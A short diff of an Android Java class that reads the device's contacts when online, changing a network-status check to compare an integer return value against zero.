@@ -60,7 +60,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
 				null, null, null);
 
-		if (NetworkChangeReceiver.isOnline(mContext)) {
+		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
 				if (cur.getCount() > 0) {
 				while (cur.moveToNext()) {
 					complete = "0";
